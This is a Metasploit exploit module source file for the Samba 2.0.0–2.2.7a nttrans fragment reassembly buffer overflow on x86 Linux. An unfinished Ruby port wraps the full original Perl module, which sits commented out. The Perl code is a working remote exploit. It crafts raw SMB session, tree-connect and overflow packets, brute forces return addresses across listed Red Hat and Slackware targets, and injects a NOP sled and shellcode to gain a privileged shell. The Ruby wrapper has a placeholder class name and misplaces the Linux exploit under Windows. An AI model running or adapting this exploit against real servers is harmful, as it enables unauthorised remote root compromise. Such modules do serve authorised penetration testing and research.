require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Samba Fragment Reassembly Overflow',
			'Description'    => %q{
				This exploits the buffer overflow found in Samba versions
				2.0.0 to 2.2.7a. This particular module is capable of
				exploiting the bug on x86 Linux only. Flatline's sambash
				code was used as a reference for this module.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '6323'],
					[ 'MIL', '52'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'linux',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Jul 27 2003',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::samba_nttrans;
use base 'Msf::Exploit';
use strict;
use Pex::Text;

my $advanced =
  {
	'BaseAddress'  => [0, 'Specify a single base address to try'],
	'StartAddress' => [0, 'Override the target start address'],
	'StopAddress'  => [0, 'Override the target stop address'],
	'StepSize'     => [0, 'Override the target step size'],
	'DebugExploit' => [0, 'Enable development mode'],
  };

my $info =
  {
	'Name'    => 'Samba Fragment Reassembly Overflow',
	'Version' => '$Revision$',
	'Authors' => [ 'H D Moore <hdm [at] metasploit.com>', ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'linux' ],
	'Priv'  => 1,

	'UserOpts'  =>
	  {
		'RHOST'   => [1, 'ADDR', 'The target address'],
		'RPORT'   => [1, 'PORT', 'The samba port', 139],
		'THREADS' => [0, 'DATA', 'The number of concurrent attempts', 25],
	  },

	'Payload' =>
	  {
		'Space'      => 1024,
		'BadChars'  => "\x00",
		'Keys'      => ['+findsock'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
        This exploits the buffer overflow found in Samba versions
        2.0.0 to 2.2.7a. This particular module is capable of
        exploiting the bug on x86 Linux only. Flatline's sambash
        code was used as a reference for this module.
}),

	'Refs'  =>
	  [
		['OSVDB', '6323'],
		['MIL', '52'],
	  ],
	  
	'Targets' =>
	  [
		["Samba Complete Brute Force",  0x08300000, 0x08000000, 1600, 0xbfffb8d0, 6200, 50],
		["Samba 2.0 Brute Force",       0x08150000, 0x08100000, 1600, 0xbfffb8d0, 6200, 30],
		["Samba 2.2 Brute Force",       0x08300000, 0x081c0000, 1600, 0xbfffb8d0, 6200, 30],
		["Samba 2.0.6 / Red Hat 6.2",   0x081389c0, 0x08138300, 1600, 0xbfffb8d0, 6200, 1],
		["Samba 2.0.7 / Red Hat 7.0",   0x0814bb40, 0x0814bb40, 1600, 0xbfffb8d0, 6200, 1],
		["Samba 2.2.1 / Red Hat 7.2",   0x081f95c0, 0x081f95c0, 1600, 0xbfffb8d0, 6200, 1],
		["Samba 2.2.5 / Red Hat 8.0",   0x08239e00, 0x08239e00, 1600, 0xbfffb8d0, 6200, 1],
		["Samba 2.2.4 / Slackware 8.1", 0x081e1140, 0x081e1140, 1600, 0xbfffb8d0, 6200, 1],
	  ],

	'Keys' => ['samba'],

	'DisclosureDate' => 'Jul 27 2003',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr' => $target_host,
		'PeerPort' => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
	  );
	if ($s->IsError) {
		$self->PrintLine("[*] Error creating socket: " . $s->GetError);
		return $self->CheckCode('Connect');
	}

	my $x = Pex::SMB->new({ 'Socket' => $s });

	$x->SMBNegotiate();
	if ($x->Error) {
		$self->PrintLine("[*] Error negotiating protocol");
		return $self->CheckCode('Generic');
	}

	$x->SMBSessionSetup();
	if ($x->Error) {
		$self->PrintLine("[*] Error setting up session");
		return $self->CheckCode('Generic');
	}

	my $version = $x->PeerNativeLM();
	$s->Close;

	if (! $version) {
		$self->PrintLine("[*] Could not determine the remote Samba version");
		return $self->CheckCode('Generic');
	}

	$self->PrintDebugLine(1, 'LanMan: '.$version);
	$self->PrintDebugLine(1, ' OpSys: '.$x->PeerNativeOS);

	if ($version =~ /samba\s+([01]|2\.0|2\.2\.[0-6]|2\.2\.7$)/i) {
		$self->PrintLine("[*] Target seems to running vulnerable version: $version");
		return $self->CheckCode('Appears');
	}

	$self->PrintLine("[*] Target does not seem to be vulnerable: $version");
	return $self->CheckCode('Safe');
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

	my $target = $self->Targets->[$target_idx];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}

	$self->PrintLine("[*] Starting attack against target ".$target->[0]);

	# Advanced option processed
	if ($self->GetVar('BaseAddress')) {
		my $ret = eval($self->GetVar('BaseAddress')) + 0;
		$target->[1] = $target->[2] = $ret;
	}

	if ($self->GetVar('StartAddress')) {
		my $ret = eval($self->GetVar('StartAddress')) + 0;
		$target->[1] = $ret;
		$target->[2] = ($ret > $target->[2]) ? $ret : $target->[2];
	}

	if ($self->GetVar('StopAddress')) {
		my $ret = eval($self->GetVar('StopAddress')) + 0;
		$target->[2] = $ret;
		$target->[1] = ($ret > $target->[1]) ? $target->[2] : $target->[1];
	}

	if ($self->GetVar('StepSize')) {
		$target->[3] = eval($self->GetVar('StepSize')) + 0;
	}

	# Standard option processing
	if ($self->GetVar('THREADS')) {
		$target->[6] = $self->GetVar('THREADS')+0;
	}

	# More than one socket can't share the same source port :(
	if ($self->GetVar('CPORT') && $target->[6] > 1) {
		$self->PrintLine("[*] Socket reuse payloads cannot be used with this target setting");
		$self->PrintLine("[*] You can force this payload by setting the THREAD variable to 1");
		return;
	}

	# Using a array ref to track current target (array would kill us on memory)
	my $tstate = [$target->[1], $target->[2], $target->[3]];
	my $tcount = ($tstate->[0] == $tstate->[1]) ?
	  1 : int(($tstate->[0] - $tstate->[1]) / ($tstate->[2]));

	$target->[6] =  $tcount < $target->[6] ? $tcount : $target->[6];

	$self->PrintLine("[*] Attack will use ".$target->[6]." threads with $tcount total attempts");

	my ($loopStart, $loopCount, $loopPrint) = (time(), 0, time());
	while ($tstate->[0] >= $tstate->[1] )
	{
		$self->PrintLine("");

		# Display a time estimate, but not too often
		if ($loopCount && $tcount > 1 && time() - $loopPrint > 10) {
			my $loopLeft = int(($tcount - ($loopCount * $target->[6])) / $target->[6]);
			if (time() - $loopStart > 1) {
				my $loopSpeed = $loopCount / (time() - $loopStart);
				my $timeLeft  = sprintf("%.1f", int($loopLeft/$loopSpeed)/60);
				$loopPrint    = time();
				if ($timeLeft ne '0.0') {
					$self->PrintLine("[*] Brute force should complete in approximately $timeLeft minutes");
				}
			}
		}
		$loopCount++;

		# If one of our connections fails, exit right away
		$self->PrintLine("[*] Establishing ".$target->[6]." connection(s) to the target...");
		my @conns = ();
		for my $idx (1 .. $target->[6])
		{
			my $s = Msf::Socket::Tcp->new
			  (
				'PeerAddr' => $target_host,
				'PeerPort' => $target_port,
				'LocalPort' => $self->GetVar('CPORT'),
			  );
			if ($s->IsError) {
				$self->PrintLine("[*] Error creating socket $idx: " . $s->GetError);
				return;
			}
			$conns[$idx-1] = $s;
		}

		my $ReqSize = 12000;

		my $SetupSession =
		  "\x00\x00\x00\x2e\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x08\x00\x00".
		  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
		  "\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x20\x02\x00\x01\x00\x00".
		  "\x00\x00";

		my $TreeConnect =
		  "\x00\x00\x00\x3c\xff\x53\x4d\x42\x70\x00\x00\x00\x00\x00\x00\x00".
		  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x64\x00\x00\x00".
		  "\x64\x00\x00\x00\x00\x00\x00\x00\x5c\x5c\x69\x70\x63\x24\x25\x6e".
		  "\x6f\x62\x6f\x64\x79\x00\x00\x00\x00\x00\x00\x00\x49\x50\x43\x24";

		my $TransRequest =
		  "\x00\x00\x00\x49\xff\x53\x4d\x42\xa0\x00\x00\x00\x00\x08\x01\x00".
		  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\xb5\x25".
		  "\x64\x00\x01\x00\x13\x00\x00\x00".pack('V', $ReqSize)."\x00\x00\x00\x00".
		  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
		  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00";

		$self->PrintLine("[*] --- Setting up the SMB session...");
		foreach my $s (@conns) { $s->Send($SetupSession) }

		$self->PrintLine("[*] --- Establishing tree connection...");
		foreach my $s (@conns) { $s->Send($TreeConnect)  }

		$self->PrintLine("[*] --- Sending first nttrans component...");
		foreach my $s (@conns) { $s->Send($TransRequest) }

		my $tgtStart = $tstate->[0];
		foreach my $s (@conns)
		{
			last if $tstate->[0] < $tstate->[1];

			# This logic was based off sambash's code
			my $BaseAddr  = $tstate->[0];
			my $StackAddr = $target->[4];
			my $TargAddr  = $StackAddr - $BaseAddr;
			my $RetAddr   = $StackAddr + $target->[5];

			# TargAddr is the integer that is added to the memcpy desintation
			# pointer that causes it to point to the top of the stack. Since
			# we are brute forcing this number, the buffer sizes below are
			# set to optimize reliability without slowing us down too much.

			my $pattern = Pex::Text::PatternCreate($ReqSize);

			substr($pattern, 0, 1024, $self->MakeNops(1024));
			substr($pattern, 1024, length($shellcode), $shellcode);
			substr($pattern, 2048, $ReqSize-2048, pack('V', $RetAddr) x (($ReqSize - 2048)  / 4));

			my $Overflow =
			  "\x00\x00\x30\x43\xff\x53\x4d\x42\xa1\x00\x00\x00\x00\x08\x01\x00".
			  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\xb5\x25".
			  "\x64\x00\x01\x00\x00\x00\x00\x00".
			  pack('V', $ReqSize).
			  "\x00\x00\x00\x00".
			  pack('V', $ReqSize).
			  "\x44\x00\x00\x00".
			  pack('V', $TargAddr).
			  "\x00\x00\x00\x00".
			  "\x00\x00\x00\x00".
			  "\x00\x00\x00\x00".
			  $pattern;

			if ($self->GetVar('DebugExploit')) {
				print STDERR "[*] Press enter to send overflow string...\n";
				<STDIN>;
			}

			# Need to pad this out for the exploit to trigger...
			$Overflow .= "\x00" x (12359 - length($Overflow));
			$s->Send($Overflow);

			# Iterate to the next target in the list
			$tstate->[0] = $tstate->[0] - $tstate->[2];
		}

		$self->PrintLine(sprintf("[*] --- Completed range 0x%.8x:0x%.8x", $tgtStart, $tstate->[0]));

		foreach my $s (@conns) {
			if ($s->Socket->connected) {
				$self->Handler($s);
				$s->Close();
			}
			undef($s);
		}

		return if $self->GetVar('DebugExploit');
	}
	return;
}


=end


end
end	
